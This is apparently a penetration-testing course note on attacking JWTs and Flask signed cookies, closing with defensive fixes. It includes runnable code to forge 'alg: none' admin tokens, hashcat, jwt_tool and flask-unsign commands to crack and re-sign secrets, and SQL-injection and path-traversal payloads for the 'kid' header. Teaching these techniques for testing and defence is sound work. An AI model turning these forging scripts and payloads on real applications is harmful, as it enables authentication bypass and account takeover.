---
tags: [vapt, session-management, jwt, intermediate]
difficulty: intermediate
module: "17 - Session Management"
topic: "17.14 Client-Side Session Tokens (JWT, Signed Cookies)"
---

# 17.14 — Client-Side Session Tokens (JWT, Signed Cookies)

## How Client-Side Sessions Work

```
SERVER-SIDE SESSION: Server stores the data
  Session ID: abc123 → DB lookup → { user_id: 42, role: "admin" }
  
CLIENT-SIDE SESSION: Client stores the data (signed!)
  Token: eyJ...  → contains { user_id: 42, role: "admin" } + signature
  Server validates signature → reads data from token (no DB lookup!)
  
WHY SIGNATURE MATTERS:
  If no signature: user could edit role="user" to role="admin"!
  With signature: any tampering invalidates the signature → server rejects
  
  BUT: Only if the signature is validated correctly!
```

---

## JWT (JSON Web Token) Overview

```
JWT FORMAT:  header.payload.signature

HEADER (base64-decoded):
  {"alg": "HS256", "typ": "JWT"}
  
PAYLOAD (base64-decoded):
  {
    "sub": "42",
    "email": "alice@example.com",
    "role": "user",
    "exp": 1640086400,
    "iat": 1640000000
  }
  
SIGNATURE:
  HMAC-SHA256(base64(header) + "." + base64(payload), SECRET_KEY)
  
DECODE:
  echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
  → {"alg":"HS256","typ":"JWT"}
  
  OR: jwt.io (paste JWT → decoded instantly)
```

---

## JWT Attack 1: Algorithm None

```
ORIGINAL JWT:
  header: {"alg": "HS256", "typ": "JWT"}
  payload: {"role": "user", "sub": "42"}
  signature: HMAC-SHA256(...)
  
ATTACK:
  Change algorithm to "none" → no signature required!
  header: {"alg": "none", "typ": "JWT"}
  payload: {"role": "admin", "sub": "1"}
  signature: (empty)
  
  Crafted JWT: base64(header) + "." + base64(payload) + "."
  (trailing dot, no signature)
  
EXPLOIT CODE:
  python3 -c "
  import base64, json
  
  header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
  payload = base64.b64encode(json.dumps({'role':'admin','sub':'1','email':'admin@example.com'}).encode()).decode().rstrip('=')
  print(f'{header}.{payload}.')  # trailing dot = empty signature
  "
  
  Send this as Authorization: Bearer TOKEN
  → If server accepts → algorithm none bypass!
```

---

## JWT Attack 2: HMAC/RSA Confusion (CVE)

```
SOME SERVERS SUPPORT BOTH:
  RS256: asymmetric (private key signs, public key verifies)
  HS256: symmetric (same secret signs AND verifies)
  
ATTACK:
  App normally uses RS256 (RSA)
  Attacker changes algorithm to HS256
  Signs the JWT with the SERVER'S PUBLIC KEY as the HMAC secret!
  
  Why? Server takes "public key" as the HS256 secret to verify
  Attacker used same "public key" to sign → VALID!
  
  Result: Attacker can forge arbitrary JWT payloads!
  
REQUIREMENTS:
  - Server accepts both RS256 and HS256
  - Server's RSA public key is obtainable (often at /jwks.json or /.well-known/openid-configuration)
```

---

## JWT Attack 3: Weak Secret (Brute Force)

```
HS256 JWT: signed with a shared secret (HMAC)
If secret is weak → brute force offline!

# HASHCAT CRACK JWT SECRET:
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/seclists/Passwords/rockyou.txt

# JWT-TOOL:
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/seclists/Passwords/rockyou.txt
# -C = crack mode  -d = dictionary

# IF FOUND:
# Secret: "secret123"
# Forge any payload:
python3 jwt_tool.py TOKEN -T -S hs256 -p "secret123"
# -T = tamper, -S = sign with algorithm

# WEAK SECRETS TO TRY:
# "secret", "password", "key", "123456", "jwt", "change_me", ""
```

---

## JWT Attack 4: "kid" Header Injection

```
"kid" (Key ID) HEADER:
  JWT header can specify which key to use for verification:
  {"alg": "HS256", "typ": "JWT", "kid": "my-key-id"}
  
ATTACKS:
  1. SQL INJECTION IN KID:
     kid: "'; SELECT 'KNOWN_VALUE' FROM dual --"
     → Server queries DB for key using kid value
     → SQLi → returns controlled value → attacker knows the "secret"!
     
  2. PATH TRAVERSAL IN KID:
     kid: "../../../dev/null"
     → Server reads file at path kid+".pem" or similar
     → Empty file = empty string as HMAC secret
     → Attacker signs with empty string → valid!
     
  3. DIRECTORY TRAVERSAL TO ATTACKER-CONTROLLED FILE:
     If attacker can write a file (upload vuln), point kid to it
```

---

## Flask Signed Cookies

```
FLASK DEFAULT SESSION:
  Flask signs cookies client-side using SECRET_KEY
  Cookie: session=eyJrZXkiOiJ2YWx1ZSJ9.SIGNATURE
  
IF SECRET_KEY IS WEAK:
  python3 -c "
  from flask_unsign import decode, crack, sign
  
  cookie = 'YOUR_FLASK_SESSION_COOKIE'
  wordlist = [b'secret', b'password', b'flask-secret', b'mysecret']
  
  for word in wordlist:
      if crack.verify(cookie, word):
          print(f'Found: {word}')
          # Forge admin cookie:
          new_data = {'user': 'admin', 'role': 'admin'}
          forged = sign(new_data, word)
          print(f'Forged: {forged}')
          break
  "
  
  # Tool: flask-unsign
  pip install flask-unsign
  flask-unsign --unsign --cookie "SESSION_COOKIE" --wordlist rockyou.txt --no-literal-eval
```

---

## Fix

```
JWT SECURITY:
  ✓ Use strong algorithm: RS256 (asymmetric) for public APIs
  ✓ Or HS256 with strong random secret (256-bit minimum)
  ✓ Reject "alg: none" explicitly
  ✓ Validate algorithm matches expected algorithm (whitelist, not trust header)
  ✓ Set short expiry (exp claim): 15 minutes for access tokens
  ✓ Validate all standard claims: exp, iss, aud, sub
  ✓ For HS256: secret must be at least 256 bits of cryptographically random data
  ✓ For RS256: keep private key secure, rotate periodically
  ✓ Sanitize "kid" header: validate against allowlist, no DB queries with it
  
FLASK:
  ✓ SECRET_KEY = os.urandom(32)  # 256-bit random key
  ✓ Store in environment variable, not in code!
```

---

## Related Notes
- [[01 - What is a Session]] — server vs client-side session
- [[07 - Insecure Session Storage]] — where to store JWT
- [[Module: JWT]] — comprehensive JWT attack module
- [[15 - Defense Secure Session Configuration]] — full hardening
